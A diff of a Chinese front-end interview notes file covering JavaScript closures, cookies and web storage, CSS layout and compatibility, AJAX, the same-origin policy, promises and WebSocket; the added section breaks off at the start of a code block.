-使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念
-
-
-闭包有三个特性：
-
->1.函数嵌套函数
-
->2.函数内部可以引用外部的参数和变量
-
->3.参数和变量不会被垃圾回收机制回收
-
-
- 具体请看：[详解js闭包](http://segmentfault.com/a/1190000000652891)
-
-
-#### 请你谈谈Cookie的弊端
-
-
-`cookie`虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。
-
-第一：每个特定的域名下最多生成20个`cookie`
-
-
-
-    1.IE6或更低版本最多20个cookie
-
-    2.IE7和之后的版本最后可以有50个cookie。
-
-    3.Firefox最多50个cookie
-
-    4.chrome和Safari没有做硬性限制
-
-
-
-`IE`和`Opera` 会清理近期最少使用的`cookie`，`Firefox`会随机清理`cookie`。
-
-
-
-`cookie`的最大大约为`4096`字节，为了兼容性，一般不能超过`4095`字节。
-
-
-
-IE 提供了一种存储可以持久化用户数据，叫做`userdata`，从`IE5.0`就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在。
-
-
-
-
-
->优点：极高的扩展性和可用性
-
-
-
-    1.通过良好的编程，控制保存在cookie中的session对象的大小。
-
-    2.通过加密和安全传输技术（SSL），减少cookie被破解的可能性。
-
-    3.只在cookie中存放不敏感数据，即使被盗也不会有重大损失。
-
-    4.控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。
-
-
->缺点：
-
-    1.`Cookie`数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉.
-
-
-    2.安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。
-
-    3.有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。
-
-
-
-#### 浏览器本地存储
-
-
-在较高版本的浏览器中，`js`提供了`sessionStorage`和`globalStorage`。在`HTML5`中提供了`localStorage`来取代`globalStorage`。
-
-
-`html5`中的`Web Storage`包括了两种存储方式：`sessionStorage`和`localStorage`。
-
-
-`sessionStorage`用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此`sessionStorage`不是一种持久化的本地存储，仅仅是会话级别的存储。
-
-
-而`localStorage`用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。
-
-
-
-#### web storage和cookie的区别
-
-
-`Web Storage`的概念和`cookie`相似，区别是它是为了更大容量存储设计的。`Cookie`的大小是受限的，并且每次你请求一个新的页面的时候`Cookie`都会被发送过去，这样无形中浪费了带宽，另外`cookie`还需要指定作用域，不可以跨域调用。
-
-
-除此之外，`Web Storage`拥有`setItem,getItem,removeItem,clear`等方法，不像`cookie`需要前端开发者自己封装`setCookie，getCookie`。
-
-
-但是`cookie`也是不可以或缺的：`cookie`的作用是与服务器进行交互，作为`HTTP`规范的一部分而存在 ，而`Web Storage`仅仅是为了在本地“存储”数据而生
-
-
-
-浏览器的支持除了`IE７`及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的`userData`其实就是`javascript`本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持`web storage`。
-
-
-`localStorage`和`sessionStorage`都具有相同的操作方法，例如`setItem、getItem`和`removeItem`等
-
-
-#### cookie 和session 的区别：
-
-     1、cookie数据存放在客户的浏览器上，session数据放在服务器上。
-
-     2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗
-
-        考虑到安全应当使用session。
-
-     3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能
-
-         考虑到减轻服务器性能方面，应当使用COOKIE。
-
-     4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。
-
-     5、所以个人建议：
-
-        将登陆信息等重要信息存放为SESSION
-
-        其他信息如果需要保留，可以放在COOKIE中
-
-
-
-
-
->`display:none`和`visibility:hidden`的区别？
-
-
-    display:none  隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。
-
-    visibility:hidden  隐藏对应的元素，但是在文档布局中仍保留原来的空间。
-
-
-
->CSS中` link` 和`@import `的区别是？
-
-    (1) link属于HTML标签，而@import是CSS提供的;
-
-    (2) 页面被加载的时，link会同时被加载，而@import被引用的CSS会等到引用它的CSS文件被加载完再加载;
-
-    (3) import只在IE5以上才能识别，而link是HTML标签，无兼容问题;
-
-    (4) link方式的样式的权重 高于@import的权重.
-
-
-
->`position:absolute`和`float`属性的异同
-
-
-
-- 共同点：对内联元素设置`float`和`absolute`属性，可以让元素脱离文档流，并且可以设置其宽高。
-
-
-- 不同点：`float`仍会占据位置，`absolute`会覆盖文档流中的其他元素。
-
-
-
->介绍一下box-sizing属性？
-
-
-`box-sizing`属性主要用来控制元素的盒模型的解析模式。默认值是`content-box`。
-
-
-- `content-box`：让元素维持W3C的标准盒模型。元素的宽度/高度由`border + padding + content`的宽度/高度决定，设置`width/height`属性指的是`content`部分的宽/高
-
-- `border-box`：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置`width/height`属性指的是`border + padding + content`
-
-
-
-标准浏览器下，按照W3C规范对盒模型解析，一旦修改了元素的边框或内距，就会影响元素的盒子尺寸，就不得不重新计算元素的盒子尺寸，从而影响整个页面的布局。
-
->CSS 选择符有哪些？哪些属性可以继承？优先级算法如何计算？ CSS3新增伪类有那些？
-
-```css
-    1.id选择器（ # myid）
-
-    2.类选择器（.myclassname）
-
-    3.标签选择器（div, h1, p）
-
-    4.相邻选择器（h1 + p）
-
-    5.子选择器（ul > li）
-
-    6.后代选择器（li a）
-
-    7.通配符选择器（ * ）
-
-    8.属性选择器（a[rel = "external"]）
-
-    9.伪类选择器（a: hover, li:nth-child）
-```
-
-
-**优先级为:**
-
-
-`!important >  id > class > tag `
-
-`important` 比 内联优先级高,但内联比 `id` 要高
-
-
-
->CSS3新增伪类举例：
-
-```css
-    p:first-of-type 选择属于其父元素的首个 <p> 元素的每个 <p> 元素。
-
-    p:last-of-type  选择属于其父元素的最后 <p> 元素的每个 <p> 元素。
-
-    p:only-of-type  选择属于其父元素唯一的 <p> 元素的每个 <p> 元素。
-
-    p:only-child    选择属于其父元素的唯一子元素的每个 <p> 元素。
-
-    p:nth-child(2)  选择属于其父元素的第二个子元素的每个 <p> 元素。
-
-    :enabled  :disabled 控制表单控件的禁用状态。
-
-    :checked        单选框或复选框被选中。
-```
-
->CSS3有哪些新特性？
-
-    CSS3实现圆角（border-radius），阴影（box-shadow），
-
-    对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）
-
-    transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);//旋转,缩放,定位,倾斜
-
-    增加了更多的CSS选择器  多背景 rgba
-
-    在CSS3中唯一引入的伪元素是::selection.
-
-    媒体查询，多栏布局
-
-    border-image
-
-CSS3中新增了一种盒模型计算方式：`box-sizing`。盒模型默认的值是`content-box`, 新增的值是`padding-box`和`border-box`，几种盒模型计算元素宽高的区别如下：
-
-#### `content-box（默认）`
-
-布局所占宽度Width：
-
-```css
-Width = width + padding-left + padding-right + border-left + border-right
-
-```
-
-布局所占高度Height:
-
-```css
-Height = height + padding-top + padding-bottom + border-top + border-bottom
-
-```
-#### `padding-box`
-
-布局所占宽度Width：
-
-```css
-Width = width(包含padding-left + padding-right) + border-top + border-bottom
-
-```
-
-布局所占高度Height:
-
-```css
-Height = height(包含padding-top + padding-bottom) + border-top + border-bottom
-
-
-```
-
-#### `border-box`
-
-布局所占宽度Width：
-
-```css
-Width = width(包含padding-left + padding-right + border-left + border-right)
-```
-
-布局所占高度Height:
-
-```css
-Height = height(包含padding-top + padding-bottom + border-top + border-bottom)
-```
-
->对BFC规范的理解？
-
-          BFC，块级格式化上下文，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个BFC中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的margin会发生折叠。
-
-        （W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行布局，以及与其他元素的关系和相互作用。
-
-
-
-#### 说说你对语义化的理解？
-
-    1，去掉或者丢失样式的时候能够让页面呈现出清晰的结构
-
-    2，有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；
-
-    3，方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；
-
-    4，便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。
-
-
-
-#### Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?
-
-
-
-1）、`<!DOCTYPE>` 声明位于文档中的最前面，处于 `<html>` 标签之前。告知浏览器以何种模式来渲染文档。
-
-
-2）、严格模式的排版和 `JS` 运作模式是  以该浏览器支持的最高标准运行。
-
-
-3）、在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。
-
-
-4）、`DOCTYPE`不存在或格式不正确会导致文档以混杂模式呈现。
-
-
-
-#### 你知道多少种`Doctype`文档类型？
-
-     该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。
-
-     HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。
-
-     XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。
-
-    Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks
-
-     （包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。
-
-
-
-#### HTML与XHTML——二者有什么区别
-
-    区别：
-
-    1.所有的标记都必须要有一个相应的结束标记
-
-    2.所有标签的元素和属性的名字都必须使用小写
-
-    3.所有的XML标记都必须合理嵌套
-
-    4.所有的属性必须用引号""括起来
-
-    5.把所有<和&特殊符号用编码表示
-
-    6.给所有属性赋一个值
-
-    7.不要在注释内容中使“--”
-
-    8.图片必须有说明文字
-
-
-#### 常见兼容性问题？
-
-
-    png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8.也可以引用一段脚本处理.
-
-    浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一。
-
-    IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。
-
-    浮动ie产生的双倍距离（IE6双边距问题：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。）
-
-    #box{ float:left; width:10px; margin:0 0 0 100px;}
-
-    这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入
-    _display:inline;将其转化为行内属性。(_这个符号只有ie6会识别)
-
-    渐进识别的方式，从总体中逐渐排除局部。
-
-
-      首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。
-
-      接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。
-
-      css
-
-          .bb{
-
-           background-color:#f1ee18;/*所有识别*/
-
-          .background-color:#00deff\9; /*IE6、7、8识别*/
-
-          +background-color:#a200ff;/*IE6、7识别*/
-
-          _background-color:#1e0bd1;/*IE6识别*/
-
-          }
-
-
-    怪异模式问题：漏写DTD声明，Firefox仍然会按照标准模式来解析网页，但在IE中会触发
-    怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写DTD声明的好习惯。现在
-    可以使用[html5](http://www.w3.org/TR/html5/single-page.html)推荐的写法：`<doctype html>`
-
-
-
->上下margin重合问题
-
-    ie和ff都存在，相邻的两个div的margin-left和margin-right不会重合，但是margin-top和margin-bottom却会发生重合。
-
-    解决方法，养成良好的代码编写习惯，同时采用margin-top或者同时采用margin-bottom。
-
-
-
-#### 解释下浮动和它的工作原理？清除浮动的技巧
-
-
-
-    浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。
-
-
-    1.使用空标签清除浮动。
-
-       这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。
-
-    2.使用overflow。
-
-       给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。
-
-    3.使用after伪对象清除浮动。
-
-       该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；
-
-
-
-#### 浮动元素引起的问题和解决办法？
-
-
-    浮动元素引起的问题：
-
-    （1）父元素的高度无法被撑开，影响与父元素同级的元素
-
-    （2）与浮动元素同级的非浮动元素（内联元素）会跟随其后
-
-    （3）若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构
-
-
-
->解决方法：
-
-使用`CSS`中的`clear:both`;属性来清除元素的浮动可解决2、3问题，对于问题1，添加如下样式，给父元素添加`clearfix`样式：
-
-```css
-    .clearfix:after{content: ".";display: block;height: 0;clear: both;visibility: hidden;}
-
-    .clearfix{display: inline-block;} /* for IE/Mac */
-```
-
-**清除浮动的几种方法：**
-
-
-```css
-    1，额外标签法，<div style="clear:both;"></div>（缺点：不过这个办法会增加额外的标签使HTML结构看起来不够简洁。）
-
-    2，使用after伪类
-
-    #parent:after{
-
-        content:".";
-
-        height:0;
-
-        visibility:hidden;
-
-        display:block;
-
-        clear:both;
-
-        }
-
-
-    3,浮动外部元素
-
-    4,设置overflow为hidden或者auto
-```
-
-
-
-#### DOM操作——怎样添加、移除、移动、复制、创建和查找节点。
-
-
->1）创建新节点
-
-          createDocumentFragment()    //创建一个DOM片段
-
-          createElement()   //创建一个具体的元素
-
-          createTextNode()   //创建一个文本节点
-
-
->2）添加、移除、替换、插入
-
-          appendChild()
-
-          removeChild()
-
-          replaceChild()
-
-          insertBefore() //并没有insertAfter()
-
-
-
->3）查找
-
-
-
-          getElementsByTagName()    //通过标签名称
-
-          getElementsByName()    //通过元素的Name属性的值(IE容错能力较强，
-          会得到一个数组，其中包括id等于name值的)
-
-          getElementById()    //通过元素Id，唯一性
-
-
-
-#### html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？
-
-
-
-      HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。
-
-      拖拽释放(Drag and drop) API
-
-      语义化更好的内容标签（header,nav,footer,aside,article,section）
-
-      音频、视频API(audio,video)
-
-      画布(Canvas) API
-
-      地理(Geolocation) API
-
-      本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；
-
-      sessionStorage 的数据在浏览器关闭后自动删除
-
-
-      表单控件，calendar、date、time、email、url、search
-
-      新的技术webworker, websocket, Geolocation
-
-
-
-
->移除的元素
-
-
-    纯表现的元素：basefont，big，center，font, s，strike，tt，u；
-
-    对可用性产生负面影响的元素：frame，frameset，noframes；
-
-
->支持HTML5新标签：
-
-
-```
-
-    IE8/IE7/IE6支持通过document.createElement方法产生的标签，
-
-    可以利用这一特性让这些浏览器支持HTML5新标签，
-
-    当然最好的方式是直接使用成熟的框架、使用最多的是html5shim框架
-
-       <!--[if lt IE 9]>
-
-       <script> src="http://html5shim.googlecode.com/svn/trunk/html5.js"</script>
-
-       <![endif]-->
-
-    如何区分： DOCTYPE声明\新增的结构元素\功能元素
-```
-
-
-
-
-#### 如何实现浏览器内多个标签页之间的通信?
-
-
-```js
-    调用localstorge、cookies等本地存储方式
-```
-
-#### 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？
-
-
-```html
-     FOUC - Flash Of Unstyled Content 文档样式闪烁
-
-     <style type="text/css" media="all">@import "../fouc.css";</style>
-
-    而引用CSS文件的@import就是造成这个问题的罪魁祸首。IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。
-
-     解决方法简单的出奇，只要在<head>之间加入一个<link>或者<script>元素就可以了。
-```
-
-
-#### null和undefined的区别？
-
-
-`null`是一个表示"无"的对象，转为数值时为0；`undefined`是一个表示"无"的原始值，转为数值时为`NaN`。
-
-
-当声明的变量还未被初始化时，变量的默认值为`undefined`。
-
-`null`用来表示尚未存在的对象，常用来表示函数企图返回一个不存在的对象。
-
-
-`undefined`表示"缺少值"，就是此处应该有一个值，但是还没有定义。典型用法是：
-
-
-
-    （1）变量被声明了，但没有赋值时，就等于undefined。
-
-
-    （2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。
-
-
-    （3）对象没有赋值的属性，该属性的值为undefined。
-
-
-    （4）函数没有返回值时，默认返回undefined。
-
-
-
-`null`表示"没有对象"，即该处不应该有值。典型用法是：
-
-
-    （1） 作为函数的参数，表示该函数的参数不是对象。
-
-    （2） 作为对象原型链的终点。
-
-
-
-#### new操作符具体干了什么呢?
-
-
-       1、创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。
-
-       2、属性和方法被加入到 this 引用的对象中。
-
-       3、新创建的对象由 this 所引用，并且最后隐式的返回 this 。
-
-
-
-    var obj  = {};
-
-    obj.__proto__ = Base.prototype;
-
-    Base.call(obj);
-
-#### js延迟加载的方式有哪些？
-
-
-    defer和async、动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）、按需异步载入js
-
-
-#### `call()` 和 `apply()` 的区别和作用？
-
-
-作用：动态改变某个类的某个方法的运行环境（执行上下文）。
-
-区别参见：[JavaScript学习总结（四）function函数部分][3]
-
-
-
-#### 哪些操作会造成内存泄漏？
-
-
-    内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。
-
-    垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。
-
-
-
-    setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。
-
-    闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）
-
-
-
-详见：[详解js变量、作用域及内存][4]
-
-
-
-
-
-#### 列举IE 与其他浏览器不一样的特性？
-
-
-
-- IE支持`currentStyle`，FIrefox使用`getComputStyle`
-
-- IE  使用`innerText`，Firefox使用`textContent`
-
-- 滤镜方面：IE:`filter:alpha(opacity= num)`；Firefox：`-moz-opacity:num`
-
-- 事件方面：IE：`attachEvent`：火狐是`addEventListener`
-
-- 鼠标位置：IE是`event.clientX`；火狐是`event.pageX`
-
-- IE使用`event.srcElement`；Firefox使用`event.target`
-
-- IE中消除list的原点仅需margin:0即可达到最终效果；FIrefox需要设置`margin:0;padding:0以及list-style:none`
-
-- CSS圆角：ie7以下不支持圆角
-
-
-
-
-
-
-#### WEB应用从服务器主动推送Data到客户端有那些方式？
-
-
-
-Javascript数据推送
-
-- `Commet`：基于HTTP长连接的服务器推送技术
-
-
-- 基于`WebSocket`的推送方案
-
-
-- `SSE`（Server-Send Event）：服务器推送数据新方式
-
-
-
-#### 对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？
-
-
-    前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。
-
-        1、实现界面交互
-
-        2、提升用户体验
-
-        3、有了Node.js，前端可以实现服务端的一些事情
-
-
-    前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好，
-
-
-
-     参与项目，快速高质量完成实现效果图，精确到1px；
-
-     与团队成员，UI设计，产品经理的沟通；
-
-     做好的页面结构，页面重构和用户体验；
-
-     处理hack，兼容、写出优美的代码格式；
-
-     针对服务器的优化、拥抱最新前端技术。
-
-
-
-
-#### 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？
-
-
-        分为4个步骤：
-
-        （1），当发送一个URL请求时，不管这个URL是Web页面的URL还是Web页面上每个资源的URL，浏览器都会开启一个线程来处理这个请求，同时在远程DNS服务器上启动一个DNS查询。这能使浏览器获得请求对应的IP地址。
-
-        （2）， 浏览器与远程`Web`服务器通过`TCP`三次握手协商来建立一个`TCP/IP`连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。
-
-        （3），一旦`TCP/IP`连接建立，浏览器会通过该连接向远程服务器发送`HTTP`的`GET`请求。远程服务器找到资源并使用HTTP响应返回该资源，值为200的HTTP响应状态表示一个正确的响应。
-
-        （4），此时，`Web`服务器提供资源服务，客户端开始下载资源。
-
-
-
-    请求返回后，便进入了我们关注的前端模块
-
-    简单来说，浏览器会解析`HTML`生成`DOM Tree`，其次会根据CSS生成CSS Rule Tree，而`javascript`又可以根据`DOM API`操作`DOM`
-
-
-
-详情：[从输入 URL 到浏览器接收的过程中发生了什么事情？][8]
-
-
-
-
-
-
-#### javascript对象的几种创建方式
-
-    1，工厂模式
-
-    2，构造函数模式
-
-    3，原型模式
-
-    4，混合构造函数和原型模式
-
-    5，动态原型模式
-
-    6，寄生构造函数模式
-
-    7，稳妥构造函数模式
-
-
-
-#### javascript继承的6种方法
-
-    1，原型链继承
-
-    2，借用构造函数继承
-
-    3，组合继承(原型+借用构造)
-
-    4，原型式继承
-
-    5，寄生式继承
-
-    6，寄生组合式继承
-
-
-
-详情：[JavaScript继承方式详解][9]
-
-
-#### 创建ajax的过程
-
-```js
-    (1)创建`XMLHttpRequest`对象,也就是创建一个异步调用对象.
-
-    (2)创建一个新的`HTTP`请求,并指定该`HTTP`请求的方法、`URL`及验证信息.
-
-    (3)设置响应`HTTP`请求状态变化的函数.
-
-    (4)发送`HTTP`请求.
-
-    (5)获取异步调用返回的数据.
-
-    (6)使用JavaScript和DOM实现局部刷新.
-
-
-    var xmlHttp = new XMLHttpRequest();
-
-    xmlHttp.open('GET','demo.php','true');
-
-    xmlHttp.send()
-
-    xmlHttp.onreadystatechange = function(){
-
-        if(xmlHttp.readyState === 4 & xmlHttp.status === 200){
-
-        }
-
-    }
-```
-
-
-
-详情：[JavaScript学习总结（七）Ajax和Http状态字][10]
-
-
-
-#### 异步加载和延迟加载
-
-    1.异步加载的方案： 动态插入script标签
-
-    2.通过ajax去获取js代码，然后通过eval执行
-
-    3.script标签上添加defer或者async属性
-
-    4.创建并插入iframe，让它异步执行js
-
-    5.延迟加载：有些 js 代码并不是页面初始化的时候就立刻需要的，而稍后的某些情况才需要的。
-
-
-
-#### ie各版本和chrome可以并行下载多少个资源
-
-
-    IE6 两个并发，iE7升级之后的6个并发，之后版本也是6个
-    Firefox，chrome也是6个
-
-
-
-####`Flash`、`Ajax`各自的优缺点，在使用中如何取舍？
-
-- `Flash`适合处理多媒体、矢量图形、访问机器；对`CSS`、处理文本上不足，不容易被搜索。
-
--` Ajax`对`CSS`、文本支持很好，支持搜索；多媒体、矢量图形、机器访问不足。
-
-- 共同点：与服务器的无刷新传递消息、用户离线和在线状态、操作DOM
-
-
-
-#### 请解释一下 JavaScript 的同源策略。
-
-
-概念:同源策略是客户端脚本（尤其是`Javascript`）的重要的安全度量标准。它最早出自`Netscape Navigator2.0`，其目的是防止某个文档或脚本从多个不同源装载。
-
-
-这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。
-
-指一段脚本只能读取来自同一来源的窗口和文档的属性。
-
-
-
-#### 为什么要有同源限制？
-
-   我们举例说明：比如一个黑客程序，他利用`Iframe`把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过`Javascript`读取到你的表单中`input`中的内容，这样用户名，密码就轻松到手了。
-
+优点：无刷新更新数据
+异步与服务器通信
+前后端负载均衡
 
 缺点：
 
-现在网站的`JS` 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 `merge` 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。
+1）ajax干掉了Back和history功能，对浏览器机制的破坏
+2）对搜索引擎支持较弱
+3）违背了URI和资源定位的初衷
 
 
 
-#### GET和POST的区别，何时使用POST？
+### 有哪些多屏适配方案
 
-
-        GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符
-
-        POST：一般用于修改服务器上的资源，对所发送的信息没有限制。
-
-
-        GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值，
-
-        也就是说Get是通过地址栏来传值，而Post是通过提交表单来传值。
-
-
-
-    然而，在以下情况中，请使用 POST 请求：
-
-    无法使用缓存文件（更新服务器上的文件或数据库）
-
-    向服务器发送大量数据（POST 没有数据量限制）
-
-    发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠
+- media query + rem
+- flex
+- 弹性布局
+- flexiable 整体缩放（动态设置缩放系数的方式，
+让layout viewport与设计图对应，极大地方便了重构，同时也避免了1px的问题）
 
 
 
 
-#### 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？
+### 从输入URL到页面展现，发生了什么（HTTP请求的过程）
+
+HTTP是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据。
+
+1.域名解析，查找缓存
+- 查找浏览器缓存（DNS缓存）
+- 查找操作系统缓存（如果浏览器缓存没有，浏览器会从hosts文件查找是否有DNS信息）
+- 查找路由器缓存
+- 查找ISP缓存
+
+2.浏览器获得对应的ip地址后，浏览器与远程`Web`服务器通过`TCP`三次握手协商来建立一个`TCP/IP`连接。
+3.TCP/IP连接建立起来后，浏览器就可以向服务器发送HTTP请求
+4.服务器处理请求，返回资源（MVC设计模式）
+5.浏览器处理（加载，解析，渲染）
+  - HTML页面加载顺序从上而下
+  - 解析文档为有意义的结构，DOM树；解析css文件为样式表对象
+  - 渲染。将DOM树进行可视化表示
+
+6.绘制网页
+  - 浏览器根据HTML和CSS计算得到渲染数，最终绘制到屏幕上
+
+一个完整HTTP请求的过程为：
+DNS Resolving -> TCP handshake -> HTTP Request -> Server -> HTTP Response -> TCP shutdown
+
+### 缓存，存储相关（cookie，web storage和session）
+
+cookie优点：
+1.可以解决HTTP无状态的问题，与服务器进行交互
+缺点：
+1.数量和长度限制，每个域名最多20条，每个cookie长度不能超过4kb
+2.安全性问题。容易被人拦截
+3.浪费带宽，每次请求新页面，cookie都会被发送过去
+
+#### cookie和session区别
+
+1.cookie数据存放在客户的浏览器上，session数据放在服务器上。
+2.session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE。
+
+sessionStorage是当前对话的缓存，浏览器窗口关闭即消失，localStorage持久存在，除非清除浏览器缓存。
+
+#### 页面缓存原理
+
+页面缓存状态是由http header决定的，一个浏览器请求信息，一个是服务器响应信息。主要包括Pragma: no-cache、Cache-Control、 Expires、 Last-Modified、If-Modified-Since。
+
+### Promise实现原理
+
+现在回顾下Promise的实现过程，其主要使用了设计模式中的观察者模式：
+
+- 通过`Promise.prototype.then`和`Promise.prototype.catch`方法将观察者方法注册到被观察者Promise对象中，同时返回一个新的Promise对象，以便可以链式调用。
+
+- 被观察者管理内部pending、fulfilled和rejected的状态转变，同时通过构造函数中传递的resolve和reject方法以主动触发状态转变和通知观察者。
+
+`Promise.then()`是异步调用的，这也是Promise设计上规定的，其原因在于同步调用和异步调用同时存在会导致混乱。
+
+为了暂停当前的 promise，或者要它等待另一个 promise 完成，只需要简单地在 then() 函数中返回另一个 promise。
+
+Promise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。
 
 
 
-     1. 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。
+一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法，理由是更接近同步的写法。
+then的第二个函数参数和catch等价
 
-     2. 事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件。；
+- Promise.all和Promise.race的区别？
 
-     3. `ev.stopPropagation()`;注意旧ie的方法 `ev.cancelBubble = true`;
+Promise.all 把多个promise实例当成一个promise实例,当这些实例的状态都发生改变时才会返回一个新的promise实例，才会执行then方法。
+Promise.race 只要该数组中的 Promise 对象的状态发生变化（无论是resolve还是reject）该方法都会返回。
 
+### HTML5相关
 
+#### websocket
 
-#### ajax的缺点和在IE下的问题？
-
-详情请见：[JavaScript学习总结（七）Ajax和Http状态字][14]
-
-
-
->ajax的缺点
-
-
-      1、ajax不支持浏览器back按钮。
-
-      2、安全问题 AJAX暴露了与服务器交互的细节。
-
-      3、对搜索引擎的支持比较弱。
-
-      4、破坏了程序的异常机制。
-
-      5、不容易调试。
-
-
->IE缓存问题
-
-在IE浏览器下，如果请求的方法是`GET`，并且请求的`URL`不变，那么这个请求的结果就会被缓存。解决这个问题的办法可以通过实时改变请求的`URL`，只要URL改变，就不会被缓存，可以通过在URL末尾添加上随机的时间戳参数(`'t'= + new Date().getTime()`)
-
-
-
-或者：
-
-
+WebSocket 使用ws或wss协议，Websocket是一个持久化的协议，相对于HTTP这种非持久的协议来说。WebSocket API最伟大之处在于服务器和客户端可以在给定的时间范围内的任意时刻，相互推送信息。WebSocket并不限于以Ajax(或XHR)方式通信，因为Ajax技术需要客户端发起请求，而WebSocket服务器和客户端可以彼此相互推送信息；XHR受到域的限制，而WebSocket允许跨域通信。
+```javascript
+// 创建一个Socket实例
